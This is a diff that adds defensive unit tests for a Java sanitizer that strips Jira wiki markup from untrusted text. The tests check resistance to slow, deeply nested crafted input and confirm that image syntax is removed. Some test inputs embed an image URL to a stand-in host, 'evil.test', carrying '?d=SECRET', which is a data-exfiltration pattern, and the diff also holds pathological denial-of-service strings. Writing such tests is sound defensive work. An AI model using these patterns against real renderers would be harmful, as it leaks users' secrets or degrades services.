@@ -60,4 +60,67 @@ class JiraWikiTextTest {
         assertThat(text.text().length()).isLessThanOrEqualTo(50);
         assertThat(JiraWikiText.plain("short", 50).truncated()).isFalse();
     }
+
+    private static String nested(int depth) {
+        String inner = "{x:}";
+        for (int level = 0; level < depth; level++) {
+            inner = "{x:" + inner + " }";
+        }
+        return inner;
+    }
+
+    @Test
+    void aCraftedDescriptionIsFilteredQuickly() {
+        String crafted = nested(60) + "\n" + "*a ".repeat(3249);
+        String spaces = "a" + " ".repeat(4000) + "b";
+
+        long started = System.nanoTime();
+        JiraWikiText.plain(crafted, 10_000);
+        JiraWikiText.plain("??a ".repeat(2499), 10_000);
+        JiraWikiText.plain(spaces.repeat(2), 10_000);
+        long millis = (System.nanoTime() - started) / 1_000_000;
+
+        assertThat(millis).isLessThan(200);
+    }
+
+    @Test
+    void hugeRawTextIsCutBeforeAnyFilterSeesIt() {
+        UntrustedText text = JiraWikiText.plain("*a ".repeat(2_000_000), 1000);
+
+        assertThat(text.truncated()).isTrue();
+        assertThat(text.text().length()).isLessThanOrEqualTo(1000);
+    }
+
+    @Test
+    void nestingDeeperThanTheRoundsLeavesNoImageOrMacroSyntax() {
+        String image = "a !https://evil.test/p.png?d=SECRET" + nested(49) + "! b";
+        String macro = "{co" + nested(60) + "de:title=x}";
+
+        for (String raw : new String[] {image, macro}) {
+            assertThat(JiraWikiText.plain(raw, 10_000).text()).doesNotContain("!", "{", "}", "[", "]", "|");
+        }
+    }
+
+    @Test
+    void anImageGluedToAWordIsStillRemovedWhenItHasAnAddress() {
+        assertThat(JiraWikiText.plain("see!https://evil.test/p.png! and 1!http://h/x.png|width=3!", 1000).text())
+                .isEqualTo("see and 1");
+        assertThat(JiraWikiText.plain("Wow!great!", 1000).text()).isEqualTo("Wow!great!");
+    }
+
+    @Test
+    void theResultIsCutAgainAfterTheFilterBecauseTableRowsGrow() {
+        UntrustedText text = JiraWikiText.plain("|a|b|c|d|e|f|\n".repeat(100), 200);
+
+        assertThat(text.text().length()).isLessThanOrEqualTo(200);
+        assertThat(text.truncated()).isTrue();
+    }
+
+    @Test
+    void theCutRemovesAClosingDelimiterBeforeTheFilterRuns() {
+        UntrustedText text = JiraWikiText.plain("*bold text here* and more text", 20);
+
+        assertThat(text.text()).isEqualTo("bold text here and");
+        assertThat(text.truncated()).isTrue();
+    }
 }
